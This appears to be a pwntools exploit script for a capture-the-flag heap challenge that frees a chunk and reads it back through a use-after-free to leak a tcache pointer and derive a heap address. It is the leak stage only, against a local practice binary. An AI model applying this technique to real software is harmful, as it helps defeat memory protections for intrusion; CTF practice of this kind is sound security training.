from pwn import *

context.log_level = "info"

def start():
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])

def menu(io, c): io.sendlineafter(b"> ", str(c).encode())
def buy(io, idx):
    menu(io, 1)
    io.sendlineafter(b"idx?: > ", str(idx).encode())

def sell(io, idx):
    menu(io, 4)
    io.sendlineafter(b"> ", str(idx).encode())

def admire(io, idx):
    menu(io, 3)
    io.sendlineafter(b"> ", str(idx).encode())
    return io.recvn(0x20)

io = start()

buy(io, 0)
sell(io, 0)
data = admire(io, 0)

q0 = u64(data[0:8])
log.success(f"tcache qword0 = {hex(q0)}")
chunk_addr = q0 << 12
log.success(f"chunk_addr (approx) = {hex(chunk_addr)}")

io.close()
